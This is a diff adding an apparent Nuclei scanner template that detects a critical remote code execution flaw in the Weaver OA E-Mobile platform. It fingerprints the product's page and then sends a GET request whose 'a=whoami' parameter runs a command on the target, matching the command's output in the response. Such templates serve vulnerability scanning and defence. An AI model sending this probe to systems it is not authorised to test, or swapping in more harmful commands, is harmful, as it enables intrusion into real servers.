@@ -1,0 +1,35 @@
+id: poc-yaml-weaver-e-mobile-error-rce
+info:
+  name: 泛微OA E-Mobile移动管理平台 error 远程代码执行漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "移动管理平台-企业管理"
+  - method: GET
+    path:
+      - "{{BaseURL}}/client/common/error?a=whoami"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "<cmd>.*?</cmd>"
+      - type: word
+        part: body
+        words:
+          - "抱歉,出错了"
